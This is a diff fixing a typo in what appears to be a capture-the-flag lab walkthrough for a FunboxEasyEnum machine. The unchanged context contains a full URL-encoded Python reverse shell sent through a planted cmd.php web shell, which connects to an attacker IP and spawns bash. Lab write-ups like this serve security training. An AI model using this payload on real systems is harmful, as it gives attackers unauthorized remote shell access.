@@ -52,7 +52,7 @@ And confirm execution
 
 ![pg_fbee_id.png](../assets/funboxeasyenum_assets/pg_fbee_id.png)
 
-Lets issues a python3 reverse shell one liner:
+Lets issue a python3 reverse shell one liner:
 
 ```
 http://192.168.182.132/cmd.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.45.202%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27
